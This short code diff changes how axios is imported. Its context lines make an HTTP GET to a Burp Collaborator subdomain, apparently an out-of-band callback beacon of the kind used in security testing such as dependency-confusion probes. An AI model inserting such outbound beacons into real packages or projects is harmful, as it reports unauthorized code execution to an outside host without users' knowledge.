@@ -1,4 +1,5 @@
-const axios = require('axios')
+// const axios = require('axios')
+import axios, { AxiosRequestConfig, AxiosPromise, AxiosResponse } from 'axios';
 
 axios
   .get('ct9xmxzn1rxdhr4bnz0dtcdz9qfh36.burpcollaborator.net/from_axois/')
